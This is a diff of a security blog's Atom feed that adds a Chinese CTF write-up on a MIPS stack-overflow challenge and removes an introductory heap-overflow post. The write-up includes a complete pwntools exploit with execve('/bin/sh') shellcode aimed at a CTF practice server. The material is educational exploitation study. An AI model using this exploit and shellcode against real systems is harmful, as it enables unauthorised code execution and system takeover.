@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2021-01-20T06:09:22.000Z</updated>
+  <updated>2021-01-28T02:35:37.000Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Jarvis OJ - Add の Write-Up</title>
+    <link href="https://coldwave96.github.io/2021/01/28/Add/"/>
+    <id>https://coldwave96.github.io/2021/01/28/Add/</id>
+    <published>2021-01-28T02:35:37.000Z</published>
+    <updated>2021-01-28T02:35:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;checksec发现是MIPS架构的32位程序：</p><p><img src="/img/Add/Add1.png" alt=""></p><p>&emsp;&emsp;连接到服务器端看下程序运行逻辑：</p><p><img src="/img/Add/Add2.png" alt=""></p><p>&emsp;&emsp;看起来是个简单的加法计算器。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;Ghidra反编译看下main函数的代码：</p><p><img src="/img/Add/Add3.png" alt=""></p><p><img src="/img/Add/Add4.png" alt=""></p><p>&emsp;&emsp;结合retdec反编译的C代码：</p><p><img src="/img/Add/Add5.png" alt=""></p><p>&emsp;&emsp;在LAB_00400b18中有这样一个片段：</p><p><img src="/img/Add/Add6.png" alt=""></p><p>&emsp;&emsp;根据main函数的代码发现buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题。</p><p>&emsp;&emsp;上图中片段可以实现打印buf的地址，想要执行这个功能需要满足buf和challenge相等，buf是由我们控制的。</p><p>&emsp;&amp;emspchallenge表面上是rand()生成的随机数，但是由于随机种子是由srand(0x123456)生成的，即为固定值，导致challenge也是固定值。</p><p>&emsp;&emsp;通过上面的分析我们可以得到栈上buf的地址，加上程序没有NX保护。所以当在buf中布置好shellcode控制程序跳转执行即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>&emsp;&emsp;利用cyclic生成200个字节，通过调试发现溢出偏移量为112即0x70。这里要注意只有退出程序才会回到返回地址，所以最后需要一个退出的操作。</p><p>&emsp;&emsp;另外在调试中发现如果直接部署在buf上，在shellcode中指令会将/bin/sh字符串修改导致get shell 失败。所以需要将shellcode再偏移4或8和字节。</p><p>&emsp;&emsp;利用msfvenom生成payload：</p><p><img src="/img/Add/Add7.png" alt=""></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>&emsp;&emsp;下面是PWN脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import CDLL</span><br><span class="line"></span><br><span class="line">sh &#x3D; remote(&quot;pwn2.jarvisoj.com&quot;, 9889)</span><br><span class="line"></span><br><span class="line">dll &#x3D; CDLL(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">dll.srand(0x123456)</span><br><span class="line">key &#x3D; dll.rand()</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;help.\n&quot;, str(key))</span><br><span class="line">sh.recvuntil(&quot;Your input was&quot;)</span><br><span class="line">stack_addr &#x3D; int(sh.recvline().strip(), 16)</span><br><span class="line"></span><br><span class="line">buf &#x3D;  b&quot;&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;0&#39;*4 + buf.ljust(0x70 - 4, &#39;0&#39;) + p32(stack_addr + 4)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(&#39;exit&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;脚本运行结果：</p><p><img src="/img/Add/Add8.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
+    
+      <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
+    
+    
+      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
+    
+      <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
+    
+      <category term="MIPS" scheme="https://coldwave96.github.io/tags/MIPS/"/>
+    
+  </entry>
   
   <entry>
     <title>Jarvis OJ - Typo の Write-Up</title>
@@ -523,33 +552,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Unlink机制的利用是堆溢出中很常见的手段，这里记录一下自己的理解。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
-    
-      <category term="Assembler" scheme="https://coldwave96.github.io/categories/Theories/Assembler/"/>
-    
-    
-      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
-    
-      <category term="Heap" scheme="https://coldwave96.github.io/tags/Heap/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>堆溢出入门基础知识</title>
-    <link href="https://coldwave96.github.io/2020/06/30/Heap/"/>
-    <id>https://coldwave96.github.io/2020/06/30/Heap/</id>
-    <published>2020-06-30T05:08:39.000Z</published>
-    <updated>2020-06-30T05:08:39.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这几天在看堆溢出相关的资料，这里简单做个小结。不是很全面，仅仅列出一些相对比较重要的内容。</p><a id="more"></a><h2 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h2><p>&emsp;&emsp;堆是由程序员自行申请和释放的内存区块，分别通过malloc和free函数实现。根据Linux系统的内存管理机制，堆其实是程序虚拟地址空间的一块连续的线性区域。与栈相反，堆由内存低地址向高地址方向增长，但是由于两者起始地址相距很远，所以基本不会出现交汇的现象。</p><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><p>&emsp;&emsp;在程序的执行过程中，由malloc申请的内存称为chunk，这块内存在ptmalloc内部用malloc_chunk结构体表示。</p><p>&emsp;&emsp;一个malloc_chunk结构如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;字段解释：</p><p>&emsp;&emsp;prev_size，如果该chunk的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那该字段记录的是前一个chunk的大小（包括chunk头）。否则，该字段可以用来存储物理相邻的前一个chunk的数据。</p><p>&emsp;&emsp;size，该chunk的大小，大小必须是2*SIZE_SZ的整数倍。32位系统中，SIZE_SZ是4；64位系统中，SIZE_SZ是8。</p><ul><li>该字段的低三个比特位对chunk的大小没有影响，他们从高到低分别表示：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* NON_MAIN_ARENA，记录当前chunk是否不属于主线程，1表示不属于，0表示属于</span><br><span class="line">* IS_MAPPED，记录当前chunk是否是由mmap分配的</span><br><span class="line">* PREV_INUSE，记录前一个chunk块是否被分配，1表示被分配，0时可以通过prev_size字段来获取上一个chunk的大小及地址，这样方便进行空闲chunk之间的合并</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;fd，bk。fd指向下一个（非物理相邻）空闲的chunk，bk指向上一个（非物理相邻）空闲的chunk。</p><p>&emsp;&emsp;fd_nextsize，bk_nextsize，只有chunk空闲的时候才使用，不过其用于较大的chunk。fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针。bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针。</p><h2 id="堆的操作"><a href="#堆的操作" class="headerlink" title="堆的操作"></a>堆的操作</h2><p>&emsp;&emsp;主要关注的是unlink，用来将一个双向链表（只存储空闲的chunk）中的一个元素取出来，应用场景有malloc、free、malloc_consolidate、realloc。</p><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>&emsp;&emsp;堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（注意是可使用的字节数位不是用户申请的字节数，因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>&emsp;&emsp;堆溢出策略有：</p><ul><li><p>覆盖与其物理相邻的下一个chunk的内容。</p></li><li><p>利用堆中机制（如unlink等）来实现任意地址写入（Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p></li></ul><p>&emsp;&emsp;堆溢出中的几个重要步骤：</p><ul><li>寻找堆分配函数；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* malloc</span><br><span class="line">* calloc，在分配后会自动进行清空</span><br><span class="line">* realloc</span><br></pre></td></tr></table></figure><ul><li>寻找危险函数;</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 输入 *&#x2F;</span><br><span class="line">* gets，直接读取一行，忽略’\x00’</span><br><span class="line">* scanf</span><br><span class="line">* vscanf</span><br><span class="line"></span><br><span class="line">&#x2F;* 输出 *&#x2F;</span><br><span class="line">* sprintf</span><br><span class="line"></span><br><span class="line">&#x2F;* 字符串 *&#x2F;</span><br><span class="line">* strcpy，字符串复制，遇到’\x00’停止</span><br><span class="line">* stract，字符串拼接，遇到’\x00’停止</span><br><span class="line">* bcopy</span><br></pre></td></tr></table></figure><ul><li>确定填充长度：计算开始写入的地址与所要覆盖的地址之间的距离。</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这几天在看堆溢出相关的资料，这里简单做个小结。不是很全面，仅仅列出一些相对比较重要的内容。&lt;/p&gt;
     
     </summary>
     
